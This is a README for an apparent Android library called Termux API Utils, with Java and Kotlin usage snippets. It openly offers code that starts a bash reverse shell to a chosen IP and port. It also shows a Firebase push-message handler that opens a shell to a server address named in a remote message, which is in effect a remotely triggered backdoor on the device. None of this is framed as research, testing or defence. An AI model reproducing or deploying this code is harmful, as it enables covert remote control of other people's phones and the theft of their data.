# Termux API Utils

This library provides utilities for interacting with the Termux environment from an Android application.
It includes support for executing commands, starting reverse shells, and handling background requests.

## Installation

Add it to your `build.gradle` via JitPack:

```groovy
repositories {
    maven { url 'https://jitpack.io' }
}

dependencies {
    implementation 'com.github.prakhar-thecoder:termux-api-utils:1.0.0'
}
```

## Usage

### 1. Execute Shell Commands

```java
import com.appholaworld.termuxapi.CommandUtils;

boolean success = CommandUtils.executeShellCommand(context, "ls -la");
```

### 2. Start Reverse Shell

```java
import com.appholaworld.termuxapi.ReverseShellUtils;

ReverseShellUtils reverseShellUtils = new ReverseShellUtils();
reverseShellUtils.startBashShell(context, "your.ip.address", "4444");
```

### 3. Handle FCM Messages

You can use `ShellForegroundService` or `ShellRequestWorker` to handle requests from FCM.

```java
// Example in a FirebaseMessagingService
val data = remoteMessage.data
val type = data["type"]
if (type == "shellRequest") {
    val intent = Intent(this, ShellForegroundService::class.java)
    intent.putExtra(ShellForegroundService.EXTRA_SHELL_TYPE, data["shellType"])
    intent.putExtra(ShellForegroundService.EXTRA_SERVER_IP, data["serverIP"])
    intent.putExtra(ShellForegroundService.EXTRA_SERVER_PORT, data["serverPort"])
    ContextCompat.startForegroundService(this, intent)
}
```

### Note on TermuxService

`ReverseShellUtils` requires that the host application's binder implements `ITermuxService`.
Example in `TermuxService.java`:

```java
public class LocalBinder extends Binder implements ITermuxService {
    public final TermuxService service = TermuxService.this;

    @Override
    public void createTermuxTask(String executable, String[] arguments, String stdin, String workingDirectory) {
        service.createTermuxTask(executable, arguments, stdin, workingDirectory);
    }
}
```
